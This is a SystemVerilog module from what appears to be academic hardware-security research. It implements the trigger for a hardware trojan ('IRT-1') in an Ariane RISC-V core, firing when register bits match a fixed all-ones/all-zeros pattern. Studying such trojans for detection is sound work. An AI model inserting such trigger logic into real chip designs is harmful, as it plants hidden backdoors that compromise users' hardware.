// Author: Athanasios Moschos, Georgia Tech
// Date: 05/21/2024
// Description: Triggering module of the IRT-1 trojan.

(* DONT_TOUCH = "true|yes" *)
module trj_seltrig import ariane_pkg::*; (
  (* dont_touch = "true" *) input wire clk ,                    // Clock signal
  // Triggering mechanism
  (* dont_touch = "true" *) input wire [63:0] regBits1 ,	// The bits of the register that have a '1' value
  (* dont_touch = "true" *) input wire [63:0] regBits0 ,	// The bits of the register that have a '0' value
  (* dont_touch = "true" *) output wire trj_trigger		// The trigger signal to enable the payload
);
  wire nand64, nor65, trigger;
  reg Q_trigger;
  
  assign nand64 = ~(regBits1[0] & regBits1[1] & regBits1[2] & regBits1[3] & regBits1[4] & regBits1[5] & regBits1[6] & regBits1[7] & regBits1[8] & regBits1[9] & regBits1[10] & regBits1[11] & regBits1[12] & regBits1[13] & regBits1[14] & regBits1[15] & regBits1[16] & regBits1[17] & regBits1[18] & regBits1[19] & regBits1[20] & regBits1[21] & regBits1[22] & regBits1[23] & regBits1[24] & regBits1[25] & regBits1[26] & regBits1[27] & regBits1[28] & regBits1[29] & regBits1[30] & regBits1[31] & regBits1[32] & regBits1[33] & regBits1[34] & regBits1[35] & regBits1[36] & regBits1[37] & regBits1[38] & regBits1[39] & regBits1[40] & regBits1[41] & regBits1[42] & regBits1[43] & regBits1[44] & regBits1[45] & regBits1[46] & regBits1[47] & regBits1[48] & regBits1[49] & regBits1[50] & regBits1[51] & regBits1[52] & regBits1[53] & regBits1[54] & regBits1[55] & regBits1[56] & regBits1[57] & regBits1[58] & regBits1[59] & regBits1[60] & regBits1[61] & regBits1[62] & regBits1[63]);

  assign nor65 = ~(regBits0[0] | regBits0[1] | regBits0[2] | regBits0[3] | regBits0[4] | regBits0[5] | regBits0[6] | regBits0[7] | regBits0[8] | regBits0[9] | regBits0[10] | regBits0[11] | regBits0[12] | regBits0[13] | regBits0[14] | regBits0[15] | regBits0[16] | regBits0[17] | regBits0[18] | regBits0[19] | regBits0[20] | regBits0[21] | regBits0[22] | regBits0[23] | regBits0[24] | regBits0[25] | regBits0[26] | regBits0[27] | regBits0[28] | regBits0[29] | regBits0[30] | regBits0[31] | regBits0[32] | regBits0[33] | regBits0[34] | regBits0[35] | regBits0[36] | regBits0[37] | regBits0[38] | regBits0[39] | regBits0[40] | regBits0[41] | regBits0[42] | regBits0[43] | regBits0[44] | regBits0[45] | regBits0[46] | regBits0[47] | regBits0[48] | regBits0[49] | regBits0[50] | regBits0[51] | regBits0[52] | regBits0[53] | regBits0[54] | regBits0[55] | regBits0[56] | regBits0[57] | regBits0[58] | regBits0[59] | regBits0[60] | regBits0[61] | regBits0[62] | regBits0[63] | nand64); 

  assign trj_trigger = Q_trigger;

  always @(posedge clk) begin
    Q_trigger <= nor65;
  end  

  
endmodule

